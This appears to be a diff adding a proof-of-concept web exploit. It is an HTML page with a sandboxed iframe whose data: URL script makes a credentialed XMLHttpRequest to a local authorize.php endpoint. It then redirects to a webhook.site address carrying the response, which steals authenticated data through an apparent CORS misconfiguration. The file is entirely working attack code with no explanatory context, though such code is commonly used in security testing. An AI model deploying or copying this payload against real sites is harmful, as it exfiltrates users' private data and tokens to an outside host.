@@ -1,0 +1,12 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','http://localhost/api/v1/authorize.php',true);
+    req.withCredentials = true;
+    req.send();
+    
+    function reqListener() {
+    location='https://webhook.site/xxx/?source='+this.responseText;
+    };
+    </script>">
+</iframe>
